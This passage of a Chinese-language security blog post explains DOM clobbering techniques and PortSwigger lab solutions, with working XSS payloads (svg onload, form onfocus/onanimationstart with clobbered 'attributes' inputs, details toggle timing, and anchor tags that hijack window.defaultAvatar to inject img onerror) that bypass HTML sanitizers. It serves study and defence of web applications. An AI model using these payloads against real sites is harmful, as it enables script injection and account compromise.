&lt;p&gt;&lt;code&gt;&amp;lt;svg onload=console.log(&amp;quot;svg0&amp;quot;)&amp;gt;&amp;lt;svg onload=console.log(&amp;quot;svg1&amp;quot;)&amp;gt;&amp;lt;svg onload=console.log(&amp;quot;svg2&amp;quot;)&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最内层的 svg 先触发，然后再到下一层，而且是在 DOM 树构建完成以前就触发了相关事件；最外层的 svg 则得等到 DOM 树构建完成才能触发。&lt;/p&gt;
&lt;p&gt;method 2. 使用 input 破坏 DOM&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;style&amp;gt;@keyframes x&amp;#123;&amp;#125;&amp;lt;/style&amp;gt;&lt;/code&gt;   &lt;code&gt;&amp;lt;form style=&amp;quot;animation-name:x&amp;quot; onanimationstart=&amp;quot;alert(1)&amp;quot;&amp;gt;&lt;/code&gt;   &lt;code&gt;&amp;lt;input id=&amp;quot;attributes&amp;quot;&amp;gt;&amp;lt;input id=&amp;quot;attributes&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此时 for 循环中 el.attributes 抓到的是 form 的子标签，form 没有执行循环&lt;/p&gt;
&lt;p&gt;或者&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;form tabindex=1 onfocus=&amp;quot;alert(1);this.removeAttribute(&#39;onfocus&#39;);&amp;quot; autofocus=true&amp;gt; &amp;lt;img id=attributes&amp;gt;&amp;lt;img id=attributes&amp;gt;&amp;lt;/form&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;form tabindex=1 onfocus=&amp;quot;alert(1);this.removeAttribute(&#39;onfocus&#39;);&amp;quot; autofocus=true&amp;gt; &amp;lt;input id=attributes&amp;gt;&amp;lt;input id=attributes&amp;gt;&amp;lt;/form&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;tabindex 的作用：&lt;/p&gt;
&lt;p&gt;设置 tab 选中的标签，tabindex=1 或 - 1，代表开始就选中，如果只有一个，只要有 tabindex 默认就选中&lt;/p&gt;
&lt;p&gt;需要两个 input 因为有两个 input 时组成了一个 htmlcollection，是可迭代对象。删除 name 的属性后 input 标签仍然可以 onfocus 实现弹窗&lt;/p&gt;
&lt;p&gt;onfoucs 是 input 属性，form 中必须有 input 才能聚焦&lt;/p&gt;
&lt;p&gt;method 3. 利用 details 弹窗&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ParseAttribute&lt;/code&gt;  正是在解析文档处理标签属性的时候被调用的。注释也写到了，分发 toggle 事件的操作是异步的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;details 标签的 toggle 事件是异步触发的，并且直接对 details 标签的移除不会清除原先通过属性设置的异步任务&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将 details 改为同步执行&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;variable constant_&#34;&gt;data&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;decodeURIComponent&lt;/span&gt;(location.hash.&lt;span class=&#34;title function_ invoke__&#34;&gt;substr&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;variable constant_&#34;&gt;root&lt;/span&gt; = document.&lt;span class=&#34;title function_ invoke__&#34;&gt;createElement&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;div&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root.innerHTML = data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;setTimeout&lt;/span&gt;( () =&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (let el of root.&lt;span class=&#34;title function_ invoke__&#34;&gt;querySelectorAll&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;*&amp;#x27;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     let attrs = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (let attr of el.attributes) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      attrs.&lt;span class=&#34;title function_ invoke__&#34;&gt;push&lt;/span&gt;(attr.name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (let name of attrs) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      el.&lt;span class=&#34;title function_ invoke__&#34;&gt;removeAttribute&lt;/span&gt;(name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    document.body.&lt;span class=&#34;title function_ invoke__&#34;&gt;appendChild&lt;/span&gt;(root)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; , &lt;span class=&#34;number&#34;&gt;2000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样保证了 alert 一定会在 js 删除之前执行，执行点在 innerHTML&lt;/p&gt;
&lt;p&gt;如果没有弹出，可能在 js 删除之后才执行&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;const data = decodeURIComponent(location.hash.substr(1));;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;const root = document.createElement(&amp;#x27;div&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root.innerHTML = data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;let details = root.querySelector(&amp;quot;details&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root.removeChild(details)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;for (let el of root.querySelectorAll(&amp;#x27;*&amp;#x27;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; let attrs = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; for (let attr of el.attributes) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  attrs.push(attr.name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; for (let name of attrs) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  el.removeAttribute(name);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;details 异步执行是将执行函数放入一个事件队列中，只要事件不停止，在放入事件队列中，删除 details 已经没用，事件队列仍会执行&lt;/p&gt;
&lt;p&gt;details 有延迟的话肯定执行成功，因为此时异步事件已经执行完成，执行点在 innerhtml 如果没有延迟，有可能在 js 删除属性之后，异步事件才执行完成&lt;/p&gt;
&lt;h2 id=&#34;dom-clobbering-burp-suite&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dom-clobbering-burp-suite&#34;&gt;#&lt;/a&gt; Dom Clobbering - Burp Suite&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4MDkwNjM2NzktYzAxY2IzM2EtYWQ2MS00ZTg0LTg2MTgtZGU1M2E4MjI4YjU4Lm1k&#34;&gt;📎Exploiting DOM clobbering to enable XSS.md&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;lab-exploiting-dom-clobbering-to-enable-xss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lab-exploiting-dom-clobbering-to-enable-xss&#34;&gt;#&lt;/a&gt; Lab: Exploiting DOM clobbering to enable XSS&lt;/h3&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;function displayComments(comments) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    let userComments = document.getElementById(&amp;quot;user-comments&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (let i = 0; i &amp;lt; comments.length; ++i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        comment = comments[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        let commentSection = document.createElement(&amp;quot;section&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        commentSection.setAttribute(&amp;quot;class&amp;quot;, &amp;quot;comment&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        let firstPElement = document.createElement(&amp;quot;p&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        let defaultAvatar = window.defaultAvatar || &amp;#123;avatar: &amp;#x27;/resources/images/avatarDefault.svg&amp;#x27;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        let avatarImgHTML = &amp;#x27;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;img&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;class&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;avatar&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;src&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27; + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + &amp;#x27;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        let divImgContainer = document.createElement(&amp;quot;div&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        divImgContainer.innerHTML = avatarImgHTML&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;test1&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;test1&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;test2&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;返回HTMLCollection(2) [a#test1, a#test1, test1: a#test1, test2: a#test1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;通过test1取到collections中，test2取到第二个a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--&amp;gt; window.test1.test2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;test1&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;test2&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;--&amp;gt; node.attributes.length &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a id=defaultAvatar&amp;gt;&amp;lt;a id=defaultAvatar name=avatar href=&amp;quot;cid:&amp;amp;quot;onerror=alert(2)&amp;quot;//&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a id=defaultAvatar href=&amp;quot;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;a id=defaultAvatar name=avatar href=&amp;quot;1:&amp;amp;quot;onerror=alert(1)//&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里很明显我们可以用 Dom Clobbering 来控制  &lt;code&gt;window.defaultAvatar&lt;/code&gt; ，只要我们原来没有头像就可以用一个构造一个 &lt;code&gt;defaultAvatar.avatar&lt;/code&gt;  进行 XSS 了。&lt;/p&gt;
&lt;p&gt;触发后&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img class=&amp;quot;avatar&amp;quot; src=&amp;quot;cid:&amp;quot; onerror=&amp;quot;alert(1)&amp;quot;//&amp;quot;&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;href 中的内容需要符合 dompurify 中的协议&lt;/p&gt;
&lt;p&gt;至于为什么要用 a 标签，在 ok boomer 中有详细解释，因为 a 标签不继承 tostring 方法&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;  元素的情况下， &lt;code&gt;toString&lt;/code&gt;  只返回一个 &lt;code&gt;href&lt;/code&gt;  属性值。最终把 href 中的内容放入 img 的 src 中&lt;/p&gt;
&lt;h3 id=&#34;labclobbering-dom-attributes-to-bypass-html-filters&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#labclobbering-dom-attributes-to-bypass-html-filters&#34;&gt;#&lt;/a&gt; Lab:Clobbering DOM attributes to bypass HTML filters&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;HTMLJanitor.prototype.clean = function (html) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;const sandbox = document.implementation.createHTMLDocument(&amp;#x27;&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;const root = sandbox.createElement(&amp;quot;div&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root.innerHTML = html;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;this._sanitize(sandbox, root);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;return root.innerHTML;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span 